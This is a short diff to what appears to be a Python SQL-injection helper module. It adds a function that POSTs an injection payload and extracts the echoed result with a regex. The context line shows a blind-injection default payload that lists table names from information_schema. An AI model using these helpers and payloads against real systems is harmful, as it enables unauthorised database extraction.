@@ -1,5 +1,6 @@
 import datetime
 import requests
+import re as regx
 from urllib.parse import quote
 from utfc.StrFunc import  printbi,printc,cmd_color
 Alphabet = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'j', 'h', 'i', 'g', 'k',
@@ -183,4 +184,12 @@ def bi(pl='group_concat(table_name)',plf=' from information_schema.tables where 
 
 '''
 
-
+'''
+带回显的盲注
+'''
+def err_echo_post(url,pl,r = None,rend='</br>'):
+    rt = requests.post(url,data=pl).text
+    if r==None :
+        return rt
+    else:
+        return regx.findall(rf'({r}.*?){rend}',rt)
